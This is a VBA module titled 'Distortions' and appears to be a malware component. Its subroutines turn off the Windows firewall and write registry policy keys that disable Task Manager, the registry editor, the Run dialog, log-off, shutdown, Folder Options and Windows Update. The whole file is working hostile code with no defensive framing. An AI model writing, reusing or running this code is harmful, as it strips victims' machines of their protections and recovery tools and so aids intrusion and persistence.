Attribute VB_Name = "Distortions"
Public Sub FirewallDistortion()
    'This public sub Disables the Firewall
    Dim fwMgr
    Set fwMgr = CreateObject("HNetCfg.FwMgr")
    Dim profile
    Set profile = fwMgr.LocalPolicy.CurrentProfile
    profile.FIREWALLENABLED = False
End Sub

Public Sub TaskManagerDistortion()
    'Disables TaskManager by inserting two keys, one of the keys requires the current user to have administrative access to the machine.
    Set Get_shell = CreateObject("Wscript.Shell")
    Get_shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
    Get_shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
End Sub

Public Sub RegistryDistortion()
    'Disables Registry by inserting two keys, one of the keys requires the current user to have administrative access to the machine.
    Set Get_shell = CreateObject("Wscript.Shell")
    Get_shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
    Get_shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
End Sub
Public Sub RunDistortion()
    Set Get_shell = CreateObject("Wscript.Shell")
    Get_shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
End Sub
Public Sub LogOffDistortion()
    Set Get_shell = CreateObject("Wscript.Shell")
    Get_shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff", 1, "REG_DWORD"
End Sub
Public Sub ShutdownDistortion()
    Set Get_shell = CreateObject("Wscript.Shell")
    Get_shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
End Sub
Public Sub FolderOptionsDistortion()
  Set Get_shell = CreateObject("Wscript.Shell")
  Get_shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions", 1, "REG_DWORD"
End Sub
Public Sub WindowsUpdateDistortion()
    Set Get_shell = CreateObject("Wscript.Shell")
    Get_shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWindowsUpdate", 1, "REG_DWORD"
End Sub
